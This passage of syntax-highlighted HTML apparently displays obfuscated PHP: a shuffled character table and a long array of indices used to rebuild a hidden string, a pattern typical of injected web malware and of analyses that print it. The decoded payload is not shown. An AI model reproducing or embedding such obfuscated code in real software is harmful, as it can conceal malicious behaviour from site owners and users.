#2AA198">&quot;.&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;l&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;$&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;d&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;`&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;%&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;N&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;*&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;[&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;0&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;}&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;J&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;-&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;5&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;_&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;A&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;=&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;{&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;k&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;o&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;7&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;#&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;i&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;I&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;Y&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;(&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;j&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;/&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;?&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;K&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;c&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;B&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;t&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;R&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;4&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;8&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;e&quot;</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">&quot;|&quot;</span><span style="color: #93A1A1">);</span>
<span style="color: #268BD2">$order</span><span style="color: #719e07">=array</span><span style="color: #93A1A1">(</span><span style="color: #2AA198">59</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">71</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">73</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">13</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">35</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">10</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">20</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">76</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">10</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">76</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">30</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">45</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">20</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">23</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">60</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">83</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">43</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">38</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">17</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">83</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">43</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">60</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">17</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">45</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">83</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">23</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">49</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">49</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">17</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">17</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">49</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">17</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">80</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">3</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">86</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">27</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">88</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">77</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">80</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">38</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">20</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">76</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">15</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">30</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">27</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">88</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">32</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">45</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">52</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">80</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">58</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">83</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">43</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">38</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">72</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">11</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">70</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">42</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">60</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">17</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">75</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">49</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">45</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">12</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">7</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">81</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">49</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">91</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">68</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">93</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">18</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">40</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">25</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">90</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">87</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">24</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">72</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">37</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">28</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">48</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">19</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">66</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">63</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">50</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">5</span><span style="color: 